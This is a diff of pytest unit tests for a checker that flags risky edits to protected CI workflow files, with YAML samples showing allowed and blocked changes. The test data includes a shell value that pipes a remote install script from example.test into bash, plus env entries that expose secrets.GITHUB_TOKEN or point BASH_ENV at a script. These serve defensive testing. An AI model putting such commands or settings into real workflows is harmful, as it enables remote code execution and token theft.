@@ -1029,6 +1029,49 @@ jobs:
 
 
 @pytest.mark.unit
+def test_workflow_comment_continue_on_error_allows_safe_step_env_reference() -> None:
+    old_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post PR comment
+        env:
+          BODY: Tests passed
+        run: echo "$BODY"
+""".strip()
+    new_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post PR comment
+        env:
+          BODY: Tests passed
+        run: echo "$BODY"
+        continue-on-error: true
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert violations == []
+
+
+@pytest.mark.unit
 def test_workflow_comment_continue_on_error_with_custom_shell_is_blocked() -> None:
     old_text = """
 name: CI
@@ -1991,6 +2034,49 @@ jobs:
 
 
 @pytest.mark.unit
+def test_added_informational_step_allows_safe_env_reference() -> None:
+    old_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+""".strip()
+    new_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+      - name: Summary report
+        env:
+          BODY: Tests passed
+          RUN_ID: ${{ github.run_id }}
+        run: printf "%s %s\\n" "$BODY" "$RUN_ID"
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert violations == []
+
+
+@pytest.mark.unit
 def test_workflow_step_key_line_lookup_scans_long_step_block() -> None:
     old_text = """
 name: CI
@@ -2157,6 +2243,52 @@ jobs:
     steps:
       - name: Summary report
         run: {command}
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert violations == []
+
+
+@pytest.mark.unit
+def test_added_informational_job_allows_safe_job_env_reference() -> None:
+    old_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+""".strip()
+    new_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+  summary:
+    name: Summary report
+    runs-on: ubuntu-latest
+    env:
+      BODY: Tests passed
+    steps:
+      - name: Summary report
+        run: echo "$BODY"
 """.strip()
 
     violations = find_protected_quality_gate_changes(
@@ -2499,6 +2631,60 @@ jobs:
 
 
 @pytest.mark.unit
+@pytest.mark.parametrize(
+    "env_body",
+    [
+        "          TOKEN: harmless",
+        "          BODY: ${{ secrets.GITHUB_TOKEN }}",
+        "          BODY: ${{ env.CI_SUMMARY }}",
+        "          BASH_ENV: ./scripts/bootstrap.sh",
+    ],
+)
+def test_added_informational_step_blocks_unsafe_env_declarations(env_body: str) -> None:
+    old_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+""".strip()
+    new_text = f"""
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+      - name: Summary report
+        env:
+{env_body}
+        run: echo "$BODY"
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert len(violations) == 1
+    violation = violations[0]
+    assert violation.section == "jobs.tests.steps.Summary report"
+    assert "added workflow steps must be informational/comment/notify only" in violation.reason
+
+
+@pytest.mark.unit
 def test_added_informational_job_blocks_arbitrary_run_commands() -> None:
     old_text = """
 name: CI
@@ -2573,6 +2759,64 @@ jobs:
       - name: Summary report
         shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
         run: echo ok
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert len(violations) == 1
+    violation = violations[0]
+    assert violation.section == "jobs.summary"
+    assert "added workflow jobs must be informational/comment/notify only" in violation.reason
+
+
+@pytest.mark.unit
+@pytest.mark.parametrize(
+    "env_body",
+    [
+        "      TOKEN: harmless",
+        "      BODY: ${{ secrets.GITHUB_TOKEN }}",
+        "      BODY: ${{ env.CI_SUMMARY }}",
+        "      BASH_ENV: ./scripts/bootstrap.sh",
+    ],
+)
+def test_added_informational_job_blocks_unsafe_env_declarations(env_body: str) -> None:
+    old_text = """
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+""".strip()
+    new_text = f"""
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run pytest
+        run: uv run pytest
+  summary:
+    name: Summary report
+    runs-on: ubuntu-latest
+    env:
+{env_body}
+    steps:
+      - name: Summary report
+        run: echo "$BODY"
 """.strip()
 
     violations = find_protected_quality_gate_changes(
